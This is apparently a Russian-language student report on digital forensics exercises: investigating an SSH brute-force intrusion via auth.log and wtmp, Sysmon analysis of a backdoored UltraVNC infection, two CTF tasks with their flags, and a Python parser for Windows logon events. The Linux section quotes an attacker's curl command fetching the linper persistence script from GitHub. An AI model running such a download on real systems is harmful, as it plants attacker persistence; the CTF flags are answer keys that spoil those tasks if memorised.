<h1 align="center">Практика по компьютерной экспертизе🕵️</h1>
<h2 align="left">Содержание<br>
Анализ логов в Linux<br>
Анализ логов в Windows
</h2>
# Анализ логов в Linux
<b>Сценарий:</b><br> 
Сервер Confluence был взломан методом подбора через службу SSH. Получив доступ к серверу, злоумышленник предпринял дополнительные действия, которые мы можем отследить с помощью файлов auth.log и wtmp. В нашем расследовании мы рассмотрим весь потенциал этих артефактов, включая аспекты повышения привилегий, закрепления в системе и выполнение команд.<br>

<img width="974" height="48" alt="image" src="https://github.com/user-attachments/assets/c62ff49d-473d-4d42-82ed-2a9882107239" /><br>

<b>Задание 1.</b><br>
Проанализировать файл auth.log. Какой IP-адрес использовал злоумышленник для атаки методом перебора?

<b>Решение.</b><br>
С помощью команды ```cat auth.log | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'``` выбираем строки, содержащие ip-адреса.

<img width="974" height="290" alt="image" src="https://github.com/user-attachments/assets/01b57e31-9d10-45ec-ba44-f0e90ed9eed6" /><br>

Видим, что неудачные попытки аутентификации под пользователем admin осуществляются хостом с ip адресом 65.2.161.68

<b>Задание 2.</b><br>
Попытки подбора пароля увенчались успехом, и злоумышленник получил доступ к учетной записи на сервере. Какое имя пользователя у этой учетной записи?

<b>Решение.</b><br>
Командой ```cat auth.log | grep "Accepted"``` ищем строки, которые указывают на успешную аутентификацию.<br>

 <img width="974" height="89" alt="image" src="https://github.com/user-attachments/assets/ff5aa7dd-4ed1-4fe6-8d60-814733488e36" />

Отсюда видно, что хост с ip адресом 65.2.161.68 получил доступ к учётной записи суперпользователя - root.


<b>Задание 3.</b><br>
Определить временную метку в формате UTC, когда злоумышленник вручную вошел на сервер и установил сеанс терминала для выполнения своих задач.

<b>Решение.</b><br>
Для определения времени входа на сервер, применим парсер дат к файлу wtmp, который содержит информацию об установленных сеансах с системой.
 <img width="974" height="63" alt="image" src="https://github.com/user-attachments/assets/ed396823-b6db-47f2-8a77-fa48c1726562" />

Таким образом, хост 65.2.161.68 установил сеанс с пользователем root 2024/03/06 09:32:45

<b>Задание 4.</b><br>
Сеансы входа в систему по протоколу SSH отслеживаются, и при входе им присваивается номер сеанса. Какой номер сеанса присвоен сеансу злоумышленника для учетной записи пользователя из вопроса 2?

<b>Решение.</b><br>
Номер сеанса присваивается сразу после успешной аутентификации
 <img width="974" height="52" alt="image" src="https://github.com/user-attachments/assets/c2b22780-0021-4252-a20a-d0048cbcef73" />

В данном случае сеансу присвоен номер 37.

<b>Задание 5.</b><br>
Злоумышленник добавил нового пользователя в рамках своей стратегии закрепления на сервере и предоставил этой учетной записи более высокие привилегии. Как называется эта учетная запись?

<b>Решение.</b><br>
Анализ логов показывает, что злоумышленник создал учётную запись “cyberjunkie” и повысил её привилегии.
 <img width="974" height="195" alt="image" src="https://github.com/user-attachments/assets/624d39e9-4d01-44a8-8269-52e3624eb6f6" />


<b>Задание 6.</b><br>
Какой идентификатор подметода MITRE ATT&CK используется для закрепления в системе путем создания новой учетной записи?

<b>Решение.</b><br>
Для закрепления в системе путем создания новой учетной записи используется подметод Create Account: Local Account (ID: T1136.001)
 <img width="974" height="461" alt="image" src="https://github.com/user-attachments/assets/49867a96-44b9-4933-924e-1eb6b6b957bd" />


<b>Задание 7.</b><br>
Злоумышленник вошел в свою учетную запись с бэкдором и, воспользовавшись повышенными привилегиями, загрузил скрипт. Какая полная команда выполняется с помощью sudo?

<b>Решение.</b><br>
Злоумышленник загрузил скрипт с помощью команды ```curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh```
 
<img width="1042" height="142" alt="image" src="https://github.com/user-attachments/assets/f98b6452-4344-400c-85ac-db8d1990379d" />











<h3 align="center" id="windows_logs">Анализ логов в Windows</h3>
<b>Сценарий:</b><br>
Компания Unit42 из Пало-Альто недавно провела исследование кампании UltraVNC, в ходе которой злоумышленники использовали бэкдор-версию UltraVNC для сохранения доступа к системам. В этом сценарии мы познакомимся с журналами Sysmon и различными полезными идентификаторами событий для выявления и анализа вредоносных действий в системе Windows.
 <img width="974" height="75" alt="image" src="https://github.com/user-attachments/assets/ed5873c4-8810-4a2b-bb55-c286362491ee" />


<b>Задание 1.</b><br>
Сколько событий с идентификатором 11 (создание файла)?

<b>Решение.</b><br>
Для подсчёта воспользуемся фильтром по идентификатору события
 <img width="516" height="523" alt="image" src="https://github.com/user-attachments/assets/e33fd1e4-1e9d-4de1-8af1-de082d10a900" />


Таким образом, было подсчитано 56 событий
 <img width="974" height="186" alt="image" src="https://github.com/user-attachments/assets/547bb88b-a060-4de4-b307-22e2a2b4bd22" />


<b>Задание 2.</b><br>
При создании процесса в памяти записывается событие с идентификатором 1 с такими данными, как командная строка, хэши, путь к процессу, путь к родительскому процессу и т. д. Эта информация очень полезна для аналитика, поскольку позволяет увидеть все программы, запущенные в системе, а значит, выявить все выполняемые вредоносные процессы. Какой вредоносный процесс заразил систему жертвы?

<b>Решение.</b><br>
Аналогично выставим фильтр на события с ID=1, и посмотрим подробно каждый процесс
 <img width="974" height="724" alt="image" src="https://github.com/user-attachments/assets/4ccee8f5-5386-42a4-87a6-6a1bfdf5d6f1" />


Нас интересует процесс, содержащий подозрительный исполняемый файл - Preventivo24.02.14.exe.exe. 

На сайте VirusTotal проверяем его SHA256 хэш.
 <img width="937" height="263" alt="image" src="https://github.com/user-attachments/assets/da91c65b-65d8-4f68-96b6-1c77b9119df5" />


Действительно, сайт идентифицирует файл как троян.

<b>Задание 3.</b><br>
Какой облачный диск использовался для распространения вредоносного ПО?

<b>Решение.</b><br>
Поставим фильтр на события с ID=22, обозначающий DNS запросы выполненные системой.
 <img width="974" height="396" alt="image" src="https://github.com/user-attachments/assets/4449f9ba-0056-4af0-97b3-32237decb1f2" />


В описании запроса фигурирует доменное имя dropbox.com – облачное хранилище файлов

Заметим, что почти в это же время (03:41:26) был загружен ранее иследованный вредоносный файл
<img width="974" height="380" alt="image" src="https://github.com/user-attachments/assets/727212e0-df43-4579-a2d2-8c06a7f295f1" />

 

Таким образом, облачный диск dropbox использовался для распространения вредоносного ПО.

<b>Задание 4.</b><br>
Для многих файлов, записанных на диск, исходный вредоносный файл использовал метод обхода защиты под названием Time Stomping, при котором дата создания файла изменяется таким образом, чтобы он выглядел старше и сливался с другими файлами. На какое значение была изменена временная метка PDF-файла?

<b>Решение.</b><br>
Поставим фильтр на события с ID=2, который обозначает изменение времени создания файла и найдём событие, содержащее путь к файлу с расширением .pdf
 <img width="974" height="383" alt="image" src="https://github.com/user-attachments/assets/b581a65d-7adf-4f77-a8ec-e0e103a39979" />


Временная метка файла была изменена с 2024-02-14 03:41:58 на 2024-01-14 08:10:06.

<b>Задание 5.</b><br>
К какому IP-адресу пытался подключиться вредоносный процесс?

<b>Решение.</b><br>
Поставим фильтр на события с ID=3, обозначающий осуществление сетевого подключения.
 <img width="911" height="642" alt="image" src="https://github.com/user-attachments/assets/ab827e22-0e48-4f66-8cbd-e84b64cc962d" />

Отсюда видим, что ip-адрес назначения - 93.184.216.34

<b>Задание 6.</b><br>
Вредоносный процесс завершил работу после заражения компьютера бэкдор-версией UltraVNC. Когда завершился процесс?

<b>Решение.</b><br>
Поставим фильтр на события с ID=5, обозначающий завершение процесса.
 <img width="974" height="470" alt="image" src="https://github.com/user-attachments/assets/b47ad010-2488-4da6-aa04-76cabb81b47f" />


Завершение процесса произошло 2024-02-14 03:41:58
<h3 align="center">Анализ фрагмента сетевого трафика</h3>
 <img width="639" height="431" alt="image" src="https://github.com/user-attachments/assets/b5100c7d-3bdd-47a3-b03b-e0d8fe938903" />

Нам дан фрагмент сетевого трафика, по которому нужно найти флаг. Для выполнения этого задания воспользуемся программой Wireshark.

Открываем фрагмент в программе Wireshark и применяем фильтр по протоколу HTTP.
 <img width="974" height="144" alt="image" src="https://github.com/user-attachments/assets/131fc96b-1d98-46e1-901d-699aa9ad1ecc" />


Из фрагмента понятно, что происходит обмен пакетами между двумя узлами, один из которых клиент(172.31.33.79), а второй – сервер(172.31.33.71).

Нас интересует пакет №142: ответ веб-сервера на запрос пользователя о скачивании контента.
<img width="581" height="428" alt="image" src="https://github.com/user-attachments/assets/25886bbd-0130-42e8-9f7a-5a465b8dde83" />

 

Мы видим, что в этом пакете содержится 131134 байт контента, которые можно отобразить в Wireshark.
<img width="974" height="323" alt="image" src="https://github.com/user-attachments/assets/b05c3bca-c3f2-46ad-89b7-c107a90a2716" />
 

Флаг: ugra_this_is_icon_22bd4d0f661912acb40a338a19f
























<h3 align="center">Восстановление удалённых данных</h3>
 <img width="974" height="431" alt="image" src="https://github.com/user-attachments/assets/d5416070-c179-4172-90f4-2e1aa5c75939" />

В этом задании нам дан образ диска fs.img, на котором нужно восстановить удалённые файлы для получения флага.

Воспользуемся утилитой PhotoRec.

Запускаем программу командой ```photorec fs.img```
<img width="827" height="323" alt="image" src="https://github.com/user-attachments/assets/4e37973b-3bfb-4388-8dd6-1e2a7b067a0f" />
 

Выбираем раздел диска, на котором нужно восстановить удалённые файлы.
 <img width="974" height="320" alt="image" src="https://github.com/user-attachments/assets/cf1b9408-d75d-4a30-9943-5a8362b3cac9" />


Выбираем тип файловой системы, в нашем случае NTFS
<img width="974" height="298" alt="image" src="https://github.com/user-attachments/assets/4cff6330-6ab5-4f5b-8b2a-4f80758e6f6b" />
 

Выбираем метод анализа пространства – только свободное.
<img width="974" height="303" alt="image" src="https://github.com/user-attachments/assets/6acddc19-f199-485c-b495-e4b6090ffc50" />
 

И в конце выбираем папку для сохранения восстановленных файлов – в текущей директории.
<img width="974" height="226" alt="image" src="https://github.com/user-attachments/assets/ee57660f-f9cf-42bd-aa0d-0744fe53e40a" />
 

В папке Downloads создалась папка recup_dir.1 с восстановленными файлами.
<img width="467" height="258" alt="image" src="https://github.com/user-attachments/assets/5a310b72-1e8e-487e-a2d4-501557cc8479" />
 


На восстановленной картинке и находится наш флаг.
<img width="972" height="581" alt="image" src="https://github.com/user-attachments/assets/a1794805-6c27-4354-85d4-50378c24a47c" />
 

Также можно воспользоваться программой для анализа содержимого жёстких дисков – Autopsy.

Открываем образ диска в программе и находим вкладку с удалёнными файлами.
<img width="974" height="533" alt="image" src="https://github.com/user-attachments/assets/96df4468-fe2b-4bce-a9e3-c434a90a77aa" />
 

Во вкладке удалённых файлов находим эту же картинку.

Флаг: ugra_remember_your_backups_923894b0db94
<h3 align="center">Автоматизация обработки данных</h3>

Windows Event Logon Parser на Python – парсит журнал событий Windows по событиям успешного и неудачного входа (ID 4624 и 4625), считает количество неудачных попыток по IP, строит таймлайн и выводит в csv файл.

Импортируем библиотеки:<br>
argparse - для запуска из командной строки,<br>
pandas – для удобной организации данных,<br>
evtx – для чтения evtx файлов,<br>
Xml.etree – парсинг XML файлов,<br>
datetime – для построения таймлайна<br>
```
#!/usr/bin/env python3
import argparse
import pandas as pd
import Evtx.Evtx as evtx
import xml.etree.ElementTree as ET
from datetime import datetime
```
 
Функция parse_evtx_logons читает evtx файл, парсит по XML, фильтрует по событиям входа (ID 4624 и 4625) и собирает их дополнительные данные, такие как: время, пользователь и т.д.

```
def parse_evtx_logons(file_path):
    events = []
    with evtx.Evtx(file_path) as log:
        for record in log.records():
            xml_str = record.xml()
            root = ET.fromstring(xml_str)
            ns = {'ns': 'http://schemas.microsoft.com/win/2004/08/events/event'}
            system = root.find('ns:System', ns)
            event_id = system.find('ns:EventID', ns).text
            if event_id not in ['4624', '4625']:
                continue
            time_created = system.find('ns:TimeCreated', ns).get('SystemTime')
            computer = system.find('ns:Computer', ns).text
            event_data = root.find('ns:EventData', ns)
            data = {}
            if event_data is not None:
                for d in event_data.findall('ns:Data', ns):
                    name = d.get('Name', 'unknown')
                    data[name] = d.text
            events.append({
                'timestamp': time_created,
                'event_id': event_id,
                'computer': computer,
                'data': data
            })
    return events
``` 
В функции main собранные события нормализуются по нужным нам параметрам и сортируются по времени с помощью библиотеки pandas.

```
def main():
    parser = argparse.ArgumentParser(description='Analyze Windows Logon Events from .evtx')
    parser.add_argument('evtx', help='Path to Security.evtx file')
    parser.add_argument('--output', '-o', default='logon_report.csv', help='Output CSV file')
    args = parser.parse_args()

    print(f"[*] Parsing {args.evtx}...")
    raw_events = parse_evtx_logons(args.evtx)
    print(f"[+] Found {len(raw_events)} logon events")

    # нормализация
    rows = []
    for ev in raw_events:
        row = {
            'timestamp': pd.to_datetime(ev['timestamp']),
            'event_id': ev['event_id'],
            'computer': ev['computer'],
            'ip': ev['data'].get('IpAddress', '').replace('::ffff:', ''),  # убираем IPv6 mapping
            'user': ev['data'].get('TargetUserName', ''),
            'logon_type': ev['data'].get('LogonType', ''),
            'status': 'success' if ev['event_id'] == '4624' else 'failure'
        }
        rows.append(row)

    df = pd.DataFrame(rows)
    df.set_index('timestamp', inplace=True)
    df.sort_index(inplace=True)
 ```
Затем выводим краткую статистику по анализу: общее количество удачных и неудачных попыток входа, 10 наиболее частых неудачных попыток входа по ip и пользователю, и брутфорс-анализ.

```
print("\n=== Logon Summary ===")
    print(df.groupby('status').size())

    print("\n=== Top 10 Failed Logons by IP ===")
    failed = df[df['status'] == 'failure']
    print(failed['ip'].value_counts().head(10))

    print("\n=== Top 10 Failed Logons by User ===")
    print(failed['user'].value_counts().head(10))

    # брутфорс-детектор: больше 10 неудач с одного IP за 5 минут
    print("\n=== Potential Brute-Force IPs (threshold 10 failures in 5 min) ===")
    # используем rolling window
    failed_by_ip = failed.groupby('ip').resample('5T').size().reset_index()
    brute_ips = failed_by_ip[failed_by_ip[0] >= 10]['ip'].unique()
    print(brute_ips)

    # сохраняем CSV
    df.to_csv(args.output)
    print(f"[+] Report saved to {args.output}") 
```

В конце сохраняем отчёт в csv файл.
```
    # сохраняем CSV
    df.to_csv(args.output)
    print(f"[+] Report saved to {args.output}")

if __name__ == '__main__':
    main()
```
Пример работы скрипта:
У нас имеется журнал событий безопасности Windows: logon-events.evtx
 <img width="974" height="638" alt="image" src="https://github.com/user-attachments/assets/37de5389-10c4-4262-b1f0-14c319de60b5" />


Запускаем скрипт командой ```python3 evtx-parser.py logon-events.evtx``` и в консольном  выводе получаем краткую статистику по файлу:
 ```
[*] Parsing logon-events.evtx...
[+] Found 3133 logon events

=== Logon Summary ===
status
failure       1
success    3132
dtype: int64

=== Top 10 Failed Logons by IP ===
ip
-    1
Name: count, dtype: int64

=== Top 10 Failed Logons by User ===
user
Гость    1
Name: count, dtype: int64

=== Potential Brute-Force IPs (threshold 10 failures in 5 min) ===
[]
[+] Report saved to logon_report.csv
```
(В брутфорс-детекторе ошибка потому что недостаточно подходящих событий)

Также можно посмотреть полную статистику в csv файле:
<img width="974" height="1187" alt="image" src="https://github.com/user-attachments/assets/69c0bb01-1e1e-46fb-af0d-6e257b6faa84" />

 











